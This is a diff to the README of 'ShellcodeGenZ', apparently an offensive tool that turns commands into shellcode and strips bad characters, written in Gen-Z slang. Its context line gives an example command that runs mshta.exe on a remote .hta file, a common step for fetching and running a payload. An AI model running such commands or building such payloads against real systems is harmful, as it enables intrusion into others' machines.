@@ -11,9 +11,9 @@ ShellcodeGenZ takes your commands (like mshta.exe http://192.168.0.1/azi.hta) an
 
 ## Features That Slap
 - Shellcode Gen: Turns commands into lit shellcode.
-- Bad Char Yeeter: Spots bad chars and lets you fix 'em manual (pick your hex) or auto (add/subtract offsets).
+- Bad Char Yeeter: Spots bad chars and lets you fix 'em ( encode ) manual (pick your hex) or auto (add/subtract offsets).
 - Manual Offset Drip: Choose your own offset for auto mode, or let it test 0x01 to 0xff.
-- 0x00 Check: Always yeets 0x00 and bails if it's in push instructions.
+- 0x00 Check: Always yeets 0x00 and bails if it's in push instructions and the whole shellcode.
 - Logs for Days: Detailed logs with Gen-Z flair so you know what's good.
 - Colorful Vibes: Rockin' colorama for that terminal glow-up.
 
